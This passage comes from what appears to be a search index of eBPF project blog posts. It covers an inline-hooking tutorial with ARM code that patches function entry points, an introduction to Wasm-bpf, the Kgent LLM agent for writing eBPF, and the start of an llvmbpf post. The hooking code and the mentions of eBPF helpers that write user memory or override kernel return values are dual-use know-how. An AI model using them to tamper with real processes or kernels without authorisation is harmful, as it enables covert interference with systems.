4 bytes and you're going to replace 5 instructions. This is needed because the branch instruction uses a relative offset and you cannot be sure how far your hook function will be. If your function and hook are within 32MB of each other, you could only replace the first 4 bytes with a branch and wouldn't need to touch the rest.</p> <pre><code>#define SIZE_ORIG_BYTES 20\nstatic void inline_hook_replace_inst(void *orig_func, void *hook_func) {\n    int offset = ((intptr_t)hook_func - (intptr_t)orig_func - 8) / 4;\n    int branch_instruction = 0xEA000000 | (offset &amp; 0x00FFFFFF);\n    *(int *)orig_func = branch_instruction;\n}\n</code></pre> <p>Similar to ARM32, ARM64 uses the ARM instruction set. However, there are differences and specifics to consider for ARM64. For example, the encoding of the branch instruction is different and because of the larger address space, you have to create a trampoline for larger offsets that can't be reached by a single branch instruction. The trampoline should be close to the original function so it can be reached by a branch instruction and from there, it will load the full 64 bit address of the hook function.</p> <pre><code>#define SIZE_ORIG_BYTES 32\nstatic void inline_hook_replace_inst(void *orig_func, void *hook_func) {\n    int offset = ((intptr_t)hook_func - (intptr_t)orig_func) / 4;\n    // Check if the offset is within the allowable range for a branch instruction.\n    if (offset &lt; -0x2000000 || offset &gt; 0x1ffffff) {\n        printf(\"Offset %d out of range!\\n\", offset);\n        exit(1);\n    }\n    // Construct and write the branch instruction.\n    uint32_t branch_instruction = 0x14000000 | (offset &amp; 0x03ffffff);\n    *((uint32_t*)orig_func) = branch_instruction;\n}\n</code></pre> <p>You can find the complete example in the following repository: https://github.com/eunomia-bpf/inline-hook-demo</p>"},{"location":"blogs/inline-hook/#limitations","title":"Limitations","text":""},{"location":"blogs/inline-hook/#understanding-the-limitations-of-inline-hooking","title":"Understanding the Limitations of Inline Hooking","text":"<p>Inline Hooking, while a powerful technique for intercepting and modifying function calls in software, has several inherent limitations, particularly in the context of modern operating systems and programming environments. Here, we delve into these limitations in more detail to provide a clearer understanding of the challenges and implications involved. The demostration code is very simple and cannot be used in production.</p>"},{"location":"blogs/inline-hook/#1-operating-system-security-mechanisms","title":"1. Operating System Security Mechanisms","text":"<p>Modern operating systems deploy a variety of security mechanisms to prevent malicious or unintended modifications to executing code:</p> <ul> <li> <p>Data Execution Prevention (DEP): DEP is designed to prevent code from being run from data segments of a process, such as the stack or heap. Inline hooking often requires executing code that has been written to these segments, which can be blocked by DEP.</p> </li> <li> <p>Address Space Layout Randomization (ASLR): ASLR randomizes the memory addresses used by system and application files. This complicates the process of inline hooking since the exact address of the target function may change every time the application or system is restarted.</p> </li> <li> <p>Code Signing and Integrity Checks: Some operating systems and applications implement code signing and integrity checks. These mechanisms can detect modifications to code, including inline hooks, and may prevent the modified application from executing or flag it as malicious.</p> </li> </ul>"},{"location":"blogs/inline-hook/#2-compiler-optimizations","title":"2. Compiler Optimizations","text":"<p>Modern compilers employ various optimizations that can interfere with inline hooking:</p> <ul> <li>Function Inlining: Compilers may inline functions, which means the function's code is directly inserted into each place it is called, rather than being kept as a separate function. This can eliminate the consistent function entry point that inline hooks rely on.</li> <li>Instruction Reordering and Optimizations: Compilers might reorder instructions or optimize the function's structure in a way that doesn't align well with the assumptions made during the setup of an inline hook, potentially leading to crashes or undefined behavior.</li> </ul>"},{"location":"blogs/inline-hook/#3-multi-threading-and-concurrent-execution","title":"3. Multi-threading and Concurrent Execution","text":"<ul> <li>Thread Safety: In multi-threaded applications, ensuring that the hook is correctly applied without interrupting currently executing threads can be challenging. There's a risk of race conditions where one thread might be executing the function being hooked while another is applying the hook.</li> <li>Re-entrancy Issues: If the hooked function or the hook itself is re-entrant (can be called simultaneously from multiple threads), it complicates the inline hooking process. Care must be taken to handle such cases properly to avoid deadlocks or inconsistent program states.</li> </ul>"},{"location":"blogs/inline-hook/#4-hardware-and-architecture-specifics","title":"4. Hardware and Architecture Specifics","text":"<ul> <li>Instruction Set Differences: Different processors have different instruction sets and execution models. For instance, ARM and x86 processors have significantly different ways of handling instructions, making the process of writing a universal inline hook more complex.</li> <li>Instruction Length Variations: The length of instructions can vary (especially in variable-length instruction sets like x86), making it difficult to determine how many bytes to overwrite safely without affecting subsequent instructions.</li> </ul>"},{"location":"blogs/inline-hook/#wrapping-up","title":"Wrapping Up","text":"<p>Understanding inline hooking can substantially aid in areas such as software security, testing, and debugging. It provides an avenue to alter and control program behavior on-the-fly. While it is powerful, it also comes with its drawbacks, which need to be handled with care. In conclusion, while inline hooks are powerful tools, they should be used with caution, understanding, and a good knowledge of system architecture.</p> <p>I hope you enjoyed the journey exploring Inline Hooks. Happy coding!</p> <p>Share on  Share on </p>"},{"location":"blogs/introduce-to-wasm-bpf-bpf-community/","title":"Wasm-bpf: Bridging WebAssembly and eBPF for Kernel Programmability","text":"<p>Authors: Yu-Sheng Zheng, Mao-Lin Chou</p> <p>Wasm was initially developed as a secure sandbox for browsers, and has since evolved into a high-performance, cross-platform, and multi-language software sandbox environment for cloud-native software components. The lightweight containerization provided by Wasm also makes it a suitable runtime for the next generation of serverless platforms. Another exciting trend is the rise of eBPF, which enables cloud-native developers to build secure networking, service mesh, and observability components. It is gradually penetrating and deepening into various components of the kernel, providing more powerful programmable interaction capabilities in kernel space.</p> <p>Wasm-bpf is a new open-source project[1] that defines a set of abstract eBPF-related system interfaces and provides a corresponding development toolchain, library, and a universal Wasm + eBPF runtime platform instance. This allows applications in any Wasm virtual machine or Wasm lightweight container to sink and extend their use cases into kernel space, gaining access to almost all data from both kernel and user space. This enables programmable control at the entire operating system level in multiple areas such as networking and security, greatly expanding the applications of the WebAssembly ecosystem outside the browser.</p>"},{"location":"blogs/introduce-to-wasm-bpf-bpf-community/#bringing-more-possibilities-to-cloud-native-webassembly-with-ebpf-based-system-interfaces","title":"Bringing More Possibilities to Cloud-Native WebAssembly with eBPF-based System Interfaces","text":""},{"location":"blogs/introduce-to-wasm-bpf-bpf-community/#wasm-wasi","title":"Wasm &amp; WASI","text":"<p>You may have heard Solomon Hykes (co-founder of Docker) say:</p> <p>\"If we had WebAssembly + WASI in 2008, we probably wouldn't have needed to create Docker. That's how important and powerful WebAssembly is. It's the future of compute on the server.\"</p> <p>In 2022, WebAssembly (often abbreviated as Wasm) has become a focal point: new Wasm startups emerging, established companies announcing support for Wasm, Bytecode Alliance releasing numerous Wasm standards, Cloud Native Computing Foundation hosting two WasmDay events, and one of the largest Wasm users, Figma, being acquired by Adobe for an astounding $20 billion[2].</p> <p>Wasm is a binary format that many different languages can compile to, and this binary format can run on a wide range of operating systems and architectures. Java and .NET have similar capabilities, but there is a crucial difference with Wasm: the Wasm runtime does not trust the binary being executed. Wasm applications are isolated in a sandbox and can only access the resources explicitly allowed by the user, such as files or environment variables. Wasm also has many other ideal features (e.g., excellent performance), but it is its security model that enables Wasm to be used in a wide range of environments, from browsers to edge/IoT devices, and even to the cloud[3].</p> <p>Since we cannot rely on existing JavaScript engine interfaces available in browsers, most Wasm lightweight containers running outside the browser currently need to use WASI (WebAssembly System Interface). These runtimes allow Wasm applications to interact with their host operating systems in a similar (but not identical) way to POSIX.</p> <p>However, compared to traditional containers that can use almost any system call, the system resources that WASI can provide are very limited. It currently only offers basic support in areas such as file systems and socket network connections. There are still many gaps in terms of access, control, and management of low-level operating system resources. For example, there is no mature solution for limiting and observing resource usage and behavior of Wasm modules or external processes, fast packet forwarding and processing, or communication with external processes and access to peripherals. This limitation currently restricts most Wasm lightweight containers to compute-intensive applications, while relying on traditional container technologies for networking, security, and other aspects.</p> <p>This is why we started the Wasm-bpf project: to leverage the system interfaces provided by the current kernel-space eBPF and the ability to interact with user space, expanding the blueprint of the entire WASI ecosystem and bringing more possibilities to Wasm applications. At the same time, this approach also enhances the capabilities of eBPF programs in user space.</p> <p>In other words, just as Wasm programs running in browsers can access various system resources provided by the browser through JavaScript engine interfaces, the Wasm-bpf solution allows Wasm applications and containers to access various system resources in the kernel through the eBPF virtual machine interface. Thanks to the broad support for eBPF in the Linux kernel, as well as its portability between different kernel versions and architectures, and the reliability of the kernel BPF verifier engine, we can still ensure application portability and security boundaries to a certain extent.</p>"},{"location":"blogs/introduce-to-wasm-bpf-bpf-community/#wasm-bpf-a-lightweight-wasm-ebpf-runtime-platform","title":"Wasm-bpf: A Lightweight Wasm + eBPF Runtime Platform","text":"<p>The Wasm-bpf project has implemented a complete abstraction mechanism for the system interfaces between the kernel-space eBPF virtual machine and user space. It provides a toolchain to compile eBPF applications into Wasm modules and facilitates efficient bidirectional communication between eBPF programs and Wasm modules through shared memory, without the need for serialization. Leveraging code generation techniques, it offers a consistent and convenient development experience similar to other user space eBPF development frameworks. With the evolving ecosystem of Wasm component models, Wasm-bpf enables the integration, reuse, and unified management of eBPF applications and data processing plugins from different languages for observability, networking, and other eBPF use cases.</p> <p>With libbpf, which has become the de facto API standard for eBPF in user space, and on top of WAMR (wasm-micro-runtime), a complete universal Wasm-eBPF runtime component can be built with just over 300 lines of code. It supports most eBPF use cases and allows anyone using any mainstream Wasm runtime, any eBPF user space library, or any programming language to easily add corresponding virtual machine support and effortlessly implement Wasm-eBPF programs without significant changes.</p> <p>There have been previous explorations of combining eBPF and Wasm in the eunomia-bpf project[4], but it was not designed for native Wasm applications and lightweight containers. It did not conform to the generic programming model of Wasm-eBPF and had lower performance. Therefore, we created a new repository and focused on leveraging eBPF to enhance and extend the use cases of WebAssembly, while also improving the toolchain and development library support for Wasm-eBPF. In turn, a generic Wasm-eBPF development framework, leveraging the Wasm-related ecosystem, can also provide more possibilities for the eBPF community in user space.</p>"},{"location":"blogs/introduce-to-wasm-bpf-bpf-community/#ebpf-safely-and-effectively-extend-the-kernel","title":"eBPF: Safely and Effectively Extend the Kernel","text":"<p>eBPF is a revolutionary technology that originated in the Linux kernel and allows sandboxed programs to run in the kernel of an operating system. It is used to safely and effectively extend the functionality of the kernel without changing its source code or loading kernel modules. By enabling the runtime programmability of the operating system through sandboxed programs, application developers can dynamically add additional functionality to the operating system at runtime. The operating system guarantees security and performance, as if it were natively compiled with just-in-time (JIT) compilation and a verification engine. eBPF programs are portable between kernel versions and can be automatically updated, avoiding workload disruption and node restarts.</p> <p>Today, eBPF is widely used in various scenarios: high-performance network packet processing and load balancing in modern data centers and cloud-native environments, fine-grained observability with very low resource overhead, providing insights for performance troubleshooting, and ensuring secure execution of applications and container runtimes, to name a few. The possibilities are endless, and the innovation released by eBPF in the Linux kernel has just begun[3].</p>"},{"location":"blogs/introduce-to-wasm-bpf-bpf-community/#the-future-of-ebpf-kernels-javascript-like-programmable-interface","title":"The Future of eBPF: Kernel's JavaScript-like Programmable Interface","text":"<p>JavaScript's introduction to browsers brought programmability and sparked a revolution, making browsers develop into almost independent operating systems. Now let's go back to eBPF: to understand the impact of eBPF's programmability on the Linux kernel, it is helpful to have a high-level understanding of the structure of the Linux kernel and how it interacts with applications and hardware[4].</p> <p>The main purpose of the Linux kernel is to abstract the hardware or virtual hardware and provide a consistent API (system calls) that allows applications to run and share resources. To achieve this goal, we maintain a series of subsystems and layers to allocate these responsibilities[5]. Each subsystem typically allows some degree of configuration to cater to different user needs. If the desired behavior cannot be configured, changes to the kernel or running programs can be made to run in the kernel.</p> Support kernel module natively Writing a kernel module Modify the kernel source code and convince the Linux kernel community of the change Fix it periodically because each kernel version could break it. Security issues! <p>In reality, neither option is commonly used. The former is too costly, and the latter lacks portability.</p> <p>With eBPF, there is a new option to reprogram the behavior of the Linux kernel without changing its source code or loading kernel modules, while maintaining a certain level of consistency and compatibility between different kernel versions and ensuring security[6]. To achieve this, eBPF programs also need a corresponding API that allows user-defined applications to run and share resources within the kernel\u2014 in a sense, the eBPF virtual machine also provides a set of system call-like mechanisms. Through the communication mechanism between eBPF and user space, Wasm virtual machines and user space applications can have full access to this \"system call\", allowing them to programmatically extend traditional system call capabilities and implement more efficient programmable IO handling in various layers such as networking and file systems.</p> <p></p> <p>Today's Linux kernel is evolving towards a new model: user-defined applications can run in both user space and kernel space. User space interacts with the kernel through traditional system calls, while kernel space interacts with user space and other kernel components through BPF helper calls. As of early 2023, the eBPF virtual machine in the kernel already has over 220 helper interfaces, covering a wide range of application scenarios.</p> <p>It is worth noting that BPF helper calls and system calls are not competing with each other. Their programming models and performance advantages are completely different. They do not completely replace each other. The same goes for the Wasm and Wasi ecosystems. Although a specially designed wasi interface needs to go through a lengthy standardization process, it may provide better performance and portability guarantees in specific scenarios. On the other hand, eBPF can provide a fast and flexible extension to the system interface while ensuring the sandbox nature and portability of the Wasm environment.</p> <p>Currently, with the system interfaces provided by eBPF in the kernel and the ability to interact with user space, Wasm applications in Wasm-bpf can almost have the ability to access the data and return values of any function call in both kernel and user space (kprobe, uprobe, etc.). It can collect and understand all system calls with low overhead and obtain data packets and socket-level data for all network operations (tracepoint, socket, etc.). Additional protocol analyzers can be added in networking solutions, and any forwarding logic can be programmed easily (XDP, TC, etc.) without leaving the environment of packet processing in the Linux kernel.</p> <p>Moreover, eBPF has the ability to write data directly to the arbitrary address of any user space process (bpf_probe_write_user[7]), moderately modify the return value of kernel functions (bpf_override_return[8]), and even execute certain system calls directly in kernel space[9]. Fortunately, the eBPF bytecode undergoes strict security checks before being loaded into the kernel, ensuring that there are no memory overflows or other unsafe operations. Moreover, many functionalities that could expand the attack surface or introduce security risks require explicit enablement during kernel compilation. Similarly, specific eBPF features can be selectively enabled or disabled before loading the bytecode into the Wasm virtual machine, ensuring the security of the sandbox.</p> <p>All of these scenarios can be implemented within the Wasm lightweight container: unlike traditional Wasm usage as a data processing or control plugin, where these steps are implemented by logic outside the Wasm virtual machine, now they can be implemented within the Wasm lightweight container to access almost all system resources accessible by eBPF and provide complete control and interaction in both user and kernel space. Real-time generation of eBPF code can be used to change the behavior of the kernel logic, extending the programmability from user space to kernel space.</p>"},{"location":"blogs/introduce-to-wasm-bpf-bpf-community/#wasms-user-space-enhancements-for-ebpf-component-model","title":"Wasm's User-Space Enhancements for eBPF: Component Model","text":"<p>Standards are rarely the most exciting part of an ecosystem. And with a name like \"component model,\" it is indeed a challenging task to generate excitement. However, behind this boring name lies the most important innovation that Wasm brings to the software world.</p> <p>The component model describes how Wasm binary modules interact with each other. More specifically, two components can tell each other what services they provide and what expectations they need to fulfill. Then, Wasm modules can utilize each other's capabilities. This provides a new way for software developers to build applications. Developers can declare the components (or more abstractly, functionalities) that an application needs, and the Wasm runtime can assemble the correct set of components on behalf of the user. The component model is rapidly maturing and reference implementations have started to emerge. The year 2023 will be the year when the component model begins to redefine how we write software[10].</p> <p>Leveraging the Wasm ecosystem, especially Wasm-based lightweight container technology and component models, we can also empower eBPF applications with the following features:</p> <ul> <li><code>Portability</code>: Make eBPF tools and applications completely platform-independent and portable, without the need for recompilation for cross-platform distribution.</li> <li><code>Isolation</code>: Utilize the reliability and isolation capabilities of Wasm to make the loading and execution of eBPF programs and the data processing flow in user space more secure and reliable. In fact, the portion of eBPF application code controlling user space is usually much larger than the portion running in kernel space.</li> <li><code>Package Management</code>: Use the Wasm ecosystem and toolchain to distribute, manage, load, and run eBPF programs or tools. Currently, the eBPF program or tooling ecosystem lacks a universal package management or plugin management system.</li> <li><code>Language Independence</code>: Currently, eBPF programs are developed using various user space languages (such as Go, Rust, C, C++, Python, etc.), and more than 30 programming languages can be compiled into WebAssembly modules. This allows developers from different backgrounds (C, Go, Rust, Java, TypeScript, etc.) to write user space eBPF programs in their chosen language, without the need to learn a new language. We can even dynamically translate Wasm into eBPF programs and load them into the kernel or directly generate eBPF bytecode within the Wasm lightweight container.</li> <li><code>Agility</code>: For large eBPF applications, Wasm can serve as a plugin extension platform: extensions can be delivered and reloaded directly from the control plane at runtime. This means that anyone can load custom extensions with official and unmodified applications, and any bug fixes and/or updates to any eBPF program can be pushed and/or tested at runtime without the need for updating and/or redeploying a new binary. For observability applications that require updating data processing plugins, there is no need to go through the process of recompiling and deploying the entire application.</li> <li><code>Lightweight</code>: WebAssembly microservices consume 1% of the resources compared to Linux container applications, and the cold start time is only 1% compared to Linux container applications. For scenarios with a large number of small eBPF programs that need to be quickly deployed and stopped, the lightweight nature of Wasm greatly reduces system resource overhead.</li> </ul> <p>We have already made attempts to create Wasm-eBPF applications compliant with the OCI standard, utilizing ORAS to simplify the development, distribution, loading, and running of eBPF applications in the eBPF Hub of the LMP project[11]. We have also practiced developing user space data processing plugins for eBPF using multiple different languages simultaneously based on Wasm. With the latest Wasm-bpf framework, there are more exploratory possibilities to be pursued.</p>"},{"location":"blogs/introduce-to-wasm-bpf-bpf-community/#interaction-flow-between-user-space-and-ebpf-programs","title":"Interaction Flow Between User Space and eBPF Programs","text":"<p>eBPF programs are event-driven and run specific eBPF programs when a hook point is reached in the kernel or a user space application. To use an eBPF program, we first need to compile the corresponding source code to BPF bytecode using the clang/LLVM toolchain, which includes the definition of data structures, maps, and program segments (progs). Progs represent the program segments, and maps can be used to store data or communicate with user space. Next, we can use user space development frameworks and loading frameworks to implement a complete eBPF application.</p>"},{"location":"blogs/introduce-to-wasm-bpf-bpf-community/#typical-user-space-ebpf-development-framework","title":"Typical User Space eBPF Development Framework","text":"<p>For a complete eBPF application, we typically need to include both user space and kernel space components:</p> <ul> <li>User space programs interact with the kernel through a series of system calls (mainly bpf system calls), create the corresponding maps to store data in kernel space or communicate with user space, dynamically load different program segments based on configuration, dynamically modify bytecode or configure eBPF programs, load the bytecode information into the kernel, ensure security through a verifier, and implement bidirectional communication with the kernel through maps. Data can be passed from kernel to user space (or vice versa) using mechanisms such as ring buffers or perf buffers.</li> <li>The kernel space is responsible for specific computation logic and data collection.</li> </ul>"},{"location":"blogs/introduce-to-wasm-bpf-bpf-community/#a-new-ebpf-development-framework-built-on-user-space-wasm-ebpf-system-interfaces","title":"A New eBPF Development Framework Built on User Space Wasm-eBPF System Interfaces","text":"<p>This project can be seen as using the Wasm sandbox as another user space runtime built on top of the operating system, allowing Wasm applications to implement the same programming model and execution logic as typical user space eBPF applications. Wasm-bpf requires a runtime extension built outside the sandbox (the host) as well as runtime libraries compiled into Wasm bytecode within the sandbox to provide full support.</p> <p></p> <p>To achieve a comprehensive development model, we need:</p> <ul> <li>A Wasm module can correspond to multiple eBPF programs.</li> <li>An eBPF program instance can be shared by multiple Wasm modules.</li> <li>The eBPF program can be dynamically loaded into the kernel from the Wasm sandbox, select the desired mount point, mount or unmount, control the complete lifecycle of multiple eBPF bytecode objects, and support most eBPF program types.</li> <li>Support various types of maps and bidirectional communication with the kernel, supporting most maps types.</li> <li>Efficiently send information from kernel space to user space through ring buffers and perf event polling (or vice versa).</li> <li>Almost adaptable to all use cases using eBPF programs, with the ability to evolve and extend as kernel functionality evolves, without changes to the Wasm virtual machine system interface.</li> </ul> <p>This is the work that the Wasm-bpf project is doing. We have also proposed a new proposal for WASI: WASI-eBPF[12].</p> <p>In the Wasm-bpf project, all communication between the Wasm and eBPF virtual machines does not require serialization/deserialization mechanisms. With code generation techniques and support for BPF type format (BTF) information in the toolchain, we can achieve correct communication between different memory layouts, endianess, and pointer widths between eBPF and Wasm, with almost no additional overhead at runtime. When communicating through eBPF maps, data can be directly copied from kernel space to the memory of the Wasm virtual machine, avoiding additional overhead from multiple copies. Additionally, by automatically generating eBPF program skeletons (bpf code framework) and type definitions, the development experience for eBPF-Wasm programs in user space has been significantly improved.</p> <p>Thanks to the CO-RE (Compile-Once, Run Everywhere) technology provided by libbpf, there is no need to introduce additional recompilation processes when porting eBPF bytecode between different kernel versions, and there are no dependencies on LLVM/Clang in the runtime[14].</p> <p>A compiled eBPF-Wasm module typically only has a size of around 90Kb and can be dynamically loaded into the kernel and executed within less than 100ms. We provide several examples in the repository, corresponding to various scenarios such as observability, networking, and security, written in C/C++ or Rust.</p> <p>Thanks to the guidance and help from Associate Professor Xiaozheng Lai's team at South China University of Technology, Professor Lijun Chen's team at Xidian University, and Mr. Pu Wang and Mr. Jicheng Shi from Datan Technologies for combining Wasm and eBPF, we will continue to conduct further research and exploration on specific Wasm-bpf application scenarios with the students participating in the 2023 open-source capstone journey. In the next blog post, we will provide a more detailed analysis of the principles, performance, and corresponding code examples.</p> <p>The Wasm-bpf compilation toolchain and runtime module are currently developed and maintained by the eunomia-bpf open-source community[16], which is incubated by the eBPF Technology Exploration SIG[15] of the Lizard community. We would like to thank the PLCT Laboratory of the Institute of Software, Chinese Academy of Sciences for their strong support and funding for the community, as well as the contributions from community members. Moving forward, we will continue to improve and explore the corresponding Wasm and eBPF-related toolchains and runtime components and actively contribute to the upstream community.</p>"},{"location":"blogs/introduce-to-wasm-bpf-bpf-community/#references","title":"References","text":"<ul> <li>[1] wasm-bpf GitHub repository: https://github.com/eunomia-bpf/wasm-bpf</li> <li>[2] WebAssembly: Docker Without Containers: https://zhuanlan.zhihu.com/p/595257541</li> <li>[3] Cloud Native Project Scalability Tool WebAssembly Introduction: https://mp.weixin.qq.com/s/fap0bl6GFGi8zN5BFLpkCw</li> <li>[4] When Wasm Meets eBPF: Writing, Distributing, Loading, and Running eBPF Programs with WebAssembly: https://zhuanlan.zhihu.com/p/573941739</li> <li>[5] https://ebpf.io/</li> <li>[6] What is eBPF: https://ebpf.io/what-is-ebpf</li> <li>[7] Offensive BPF: Understanding and using bpf_probe_write_user: https://embracethered.com/blog/posts/2021/offensive-bpf-libbpf-bpf_probe_write_user/</li> <li>[8] Cloud-Native Security Attack and Defense: Analysis and Practice of Container Technology based on eBPF Escape: https://security.tencent.com/index.php/blog/msg/206</li> <li>[9] kernel-versions.md: https://github.com/iovisor/bcc/blob/master/docs/kernel-versions.md</li> <li>[10] 5 WebAssembly Trends Predicted for 2023: https://zhuanlan.zhihu.com/p/597705400</li> <li>[11] LMP eBPF-Hub: https://github.com/linuxkerneltravel/lmp</li> <li>[12] WASI-eBPF: https://github.com/WebAssembly/WASI/issues/513</li> <li>[13] BPF BTF Explained: https://www.ebpf.top/post/kernel_btf/</li> <li>[14] BPF Portability and CO-RE (Compile Once, Run Everywhere): https://cloud.tencent.com/developer/article/1802154</li> <li>[15] eBPF Technology Exploration SIG of the Lizard Community: https://openanolis.cn/sig/ebpfresearch</li> <li>[16] eunomia-bpf project: https://github.com/eunomia-bpf/eunomia-bpf</li> <li>[17] eunomia-bpf project on Gitee: https://gitee.com/anolis/eunomia</li> </ul> <p>Share on  Share on </p>"},{"location":"blogs/kgent/","title":"Simplifying Kernel Programming: The LLM-Powered eBPF Tool","text":"<p>Kernel programming can be intimidating, requiring deep knowledge of operating system internals and programming constraints. Our latest tool, Kgent, aims to change that by making it easier than ever to create extended Berkeley Packet Filters (eBPF) programs. Kgent leverages the power of large language models (LLMs) to translate natural language prompts into eBPF code, opening up kernel programming to a wider audience.</p> <p>Our paper, \"Kgent: Kernel Extensions Large Language Model Agent,\" was recently presented at eBPF '24: Proceedings of the ACM SIGCOMM 2024 Workshop on eBPF and Kernel Extensions. Let's dive into what makes Kgent a game-changer for kernel programming.</p>"},{"location":"blogs/kgent/#the-key-idea-behind-kgent","title":"The Key Idea Behind Kgent","text":"<p>Kgent simplifies the traditionally complex process of writing eBPF programs. By translating user prompts in natural language to eBPF code, it eliminates the need for deep OS kernel knowledge. This tool combines program comprehension, symbolic execution, and feedback loops to ensure the synthesized program is accurate and aligns with the user's intent.</p>"},{"location":"blogs/kgent/#highlights","title":"Highlights","text":"<ul> <li>Natural Language to eBPF: Kgent can take user prompts in plain English and convert them into functional eBPF programs.</li> <li>Combination of Techniques: It employs a mix of program comprehension, symbolic execution, and feedback loops to ensure high accuracy.</li> <li>Evaluation: Our tests show that Kgent achieves a 2.67x improvement over GPT-4 in producing correct eBPF programs, with a high accuracy rate and minimal false positives.</li> </ul>"},{"location":"blogs/kgent/#potential-use-cases","title":"Potential Use Cases","text":"<p>Kgent can be utilized in various scenarios to facilitate kernel development and management:</p> <ol> <li>System Administrators: Helps junior sys admins create and maintain eBPF programs without needing extensive OS kernel knowledge.</li> <li>DevOps Personnel: Assists in writing and deploying kernel extensions for monitoring and tracing applications, enhancing system performance and security.</li> <li>Patch Makers: Simplifies the creation of patches by translating natural language descriptions of issues and fixes into eBPF programs.</li> <li>Kernel Developers: Speeds up the prototyping and validation of kernel extensions, saving time and reducing errors.</li> <li>Educational Purposes: Serves as a learning aid for students and new developers to understand eBPF programming through natural language interactions.</li> <li>Research and Experimentation: Provides a platform for researchers to explore new eBPF applications and test hypotheses without diving into complex coding.</li> <li>Network Tools Development: Eases the creation of custom network monitoring, security, and performance analysis tools by translating high-level requirements into efficient eBPF programs.</li> </ol>"},{"location":"blogs/kgent/#why-we-need-kgent-instead-of-just-ask-gpt","title":"Why we need kgent instead of just ask GPT?","text":"<p>While large language models (LLMs) like GPT-4 can suggest code, they often recommend incorrect helpers or non-existent APIs\u2014a phenomenon known as hallucination. Given the small and limited set of helpers and kfuncs in eBPF, these issues can be fixed relatively easily. Another common issue is incorrect attach points. In eBPF, programs must attach to specific kernel events, such as kprobes, tracepoints, and perf events. Incorrect attach events can either be rejected by the kernel or, worse, pass the verifier and load incorrectly, leading to wrong results.</p> <p>The eBPF verifier adds another layer of complexity. For instance, loop code often cannot pass the verifier due to safety checks. Although the verifier prevents harmful code, it cannot always prevent incorrect code. For example, when asked to write a program to trace TCP connect events, GPT-4's generated code failed to read the port number correctly and didn't consider IPv6.</p> <p>To help the LLM learn about new knowledge like eBPF, common approaches include fine-tuning or Retrieval-Augmented Generation (RAG). However, publicly available examples of eBPF are insufficient, and eBPF abilities can change across kernel versions. RAG is a promising solution, as it allows the model to retrieve the most up-to-date and relevant information from external sources. This method combines language model generation with relevant information retrieval from a vector database.</p>"},{"location":"blogs/kgent/#the-llm-agent-framework","title":"The LLM Agent Framework","text":"<p>To address these issues, we built an LLM agent with three core components: planning, tools, and memory.</p> <p></p> <p>Plan Component The agent follows a predefined workflow:</p> <ol> <li>Prompter: Retrieves related examples, attach points, and specs based on user input.</li> <li>Synthesis Engine: Creates eBPF candidates from the prompt.</li> <li>Comprehension Engine: Annotates the eBPF candidate, adding necessary assumptions and assertions for verification.</li> <li>Symbolic Verifier: Verifies the candidate's behavior. If invalid, the process iterates until a valid program is produced, forming a feedback loop. For some cases, it can also use ReAct mode for decision-making.</li> </ol> <p></p> <p>Tools Component The agent can use various tools like clang to compile eBPF programs, Seahorn for verification, and bpftrace for obtaining attach points and running eBPF programs.</p> <p>Memory Component The agent uses short-term in-context memory to remember past actions, errors, and decisions, ensuring the feedback loop is successful.</p> <p>Example Workflow Let\u2019s take a simple bpftrace program as an example. Suppose a user requests: \"Trace tcp_connect events for both IPv4 and IPv6 connection attempts, and display the source and destination IP addresses.\" The agent forms a prompt based on a predefined template and asks the LLM to generate the program. We use in-context learning and few-shot techniques, including examples in the template's context. The examples vector database contains samples from BCC, bpftrace, and our own collection. The agent searches for similar examples based on user input and includes these examples in the prompt.</p> <p>We also built a pipeline to generate specifications and descriptions for each hook point and helper function from the kernel source code. For instance, when building the spec database, we generate the spec for the tcp_connect_init function in the kernel using the LLM. During the synthesis step, the agent can search for related function specs with user input in the vector database.</p>"},{"location":"blogs/kgent/#limitations-and-future-work","title":"Limitations and Future Work","text":"<p>While Kgent is a significant step forward, it has some limitations. Currently, our implementation focuses on small programs under 100 lines due to the LLM's context window limit. Additionally, our eBPF program dataset is relatively small, which restricts the tool's ability to handle more complex and varied tasks. Right now, Kgent's use cases are mostly limited to simple trace programs and network functions.</p> <p>We are exploring ways to extend Kgent's capabilities. For example, we know that tools like ChatGPT can handle many tasks using its Python code interpreter. This raises exciting possibilities: can we automate larger tasks like auto-monitoring and auto-performance tuning? Could an LLM help analyze results from different tools and even find these tools automatically? Could it play a role in rapidly developing solutions for urgent problems?</p> <p>To tackle these challenges, we are considering splitting larger tasks into smaller, manageable parts, similar to the approach used by AutoGPT. This would allow the LLM to plan the overall structure of the program, generate each component, and then merge them together. Additionally, involving users in the iteration process could provide interactive feedback, improving the quality of the generated programs.</p> <p>We also acknowledge that writing correct Hoare contracts is challenging for LLMs, and current verification methods may not cover all behaviors of the generated eBPF programs. To improve this, we need better background descriptions and more robust Hoare expressions. Incorporating more software engineering practices, such as counterexample generation and test-driven development, could help ensure comprehensive verification.</p> <p>Another critical concern is security. Since eBPF runs in the kernel, any flaws could lead to significant issues. We plan to involve users more in the review process to mitigate these risks and ensure the safety of the generated programs.</p>"},{"location":"blogs/kgent/#conclusion","title":"Conclusion","text":"<p>Kgent is revolutionizing the way we approach kernel programming by making eBPF program creation accessible to a broader audience. By translating natural language into functional eBPF code, it opens up kernel extension development to system administrators, DevOps personnel, patch makers, and more. Our paper, presented at eBPF '24, highlights the potential of this tool to democratize kernel programming and foster innovation.</p> <p>We invite you to explore Kgent and see how it can transform your approach to kernel development. For more details, check out our eBPF'24 paper and visit our GitHub repository. For additional details, refer to the earlier Arxiv version: KEN: Kernel Extensions using Natural Language. For a more usable and simplified tool, check out GPTtrace. You can also try the GPTtrace simplified web demo here.</p> <p>By lowering the barrier to entry for writing eBPF programs, Kgent is promoting innovation and enhancing system capabilities, one natural language prompt at a time.</p> <p>Share on  Share on </p>"},{"location":"blogs/llvmbpf/","title":"Building High-Performance Userspace eBPF VMs with LLVM","text":"<p>We are excited to introduce llvmbpf, a new project aimed at empowering developers with a high-performance, multi-architecture eBPF virtual machine (VM) that leverages the LLVM framework for Just-In-Time (JIT) and Ahead-Of-Time (AOT) compilation.</p> <p>This component is part of the bpftime project but focuses solely on the core VM. It operates as a standalone eBPF VM library or a compiler tool. This library is optimized for performance, flexibility, and minimal dependencies, making it easy to integrate into various environments without unnecessary overhead.</p>"},{"location":"blogs/llvmbpf/#why-llvmbpf","title":"Why llvmbpf?","text":"<p>Although there are several userspace eBPF runtimes available, we built llvmbpf to address specific needs that existing solutions may not fully satisfy:</p> <ol> <li> <p>AOT Compiler: The ability to compile eBPF bytecode into native ELF object files allows developers to deploy pre-compiled eBPF programs, ensuring high performance and efficiency, especially in resource-constrained environments. Additionally, it can allow you to experiment with different optimization techniques based on 